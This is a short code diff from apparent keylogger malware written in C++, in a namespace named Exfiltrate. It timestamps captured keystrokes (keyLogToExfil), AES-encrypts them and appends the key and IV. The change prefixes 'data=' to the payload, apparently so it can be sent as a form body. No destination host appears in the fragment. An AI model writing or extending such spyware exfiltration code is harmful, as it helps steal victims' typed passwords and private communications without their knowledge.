@@ -34,7 +34,9 @@ namespace Exfiltrate
 
 		formattedData << "[" << dateTime.getDTString("/", " ", ":") << "]" << std::endl << keyLogToExfil << std::endl;
 
-		std::string sendData = Transformer::aesEncrypt(formattedData.str());
+		std::string sendData = "data=";
+		
+		sendData += Transformer::aesEncrypt(formattedData.str());
 		sendData += "\n\nkey: " + Transformer::getEncryptionKey();
 		sendData += "\niv: " + Transformer::getIV();
 
